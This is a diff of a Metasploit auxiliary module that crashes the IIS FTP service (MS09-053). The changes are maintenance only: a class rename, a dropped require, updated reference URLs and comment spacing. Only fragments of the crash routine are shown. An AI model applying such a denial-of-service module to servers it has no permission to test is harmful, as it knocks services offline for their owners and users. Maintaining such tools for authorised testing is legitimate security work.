@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Ftp
   include Msf::Auxiliary::Dos
 
@@ -35,14 +32,13 @@ class Metasploit3 < Msf::Auxiliary
           [ 'BID', '36273'],
           [ 'OSVDB', '57753'],
           [ 'MSB', 'MS09-053'],
-          [ 'URL', 'https://www.microsoft.com/technet/security/Bulletin/MS09-053.mspx'],
           [ 'URL', 'http://archives.neohapsis.com/archives/fulldisclosure/2009-09/0040.html']
         ],
       'DisclosureDate' => 'Sep 03 2009'))
   end
 
   def run
-    #Attempt to crash IIS FTP
+    # Attempt to crash IIS FTP
     begin
       return unless connect_login
       print_status('Checking if there is at least one directory ...')
@@ -115,5 +111,4 @@ class Metasploit3 < Msf::Auxiliary
     ret = [ ret, data ]
     ret
   end
-
 end
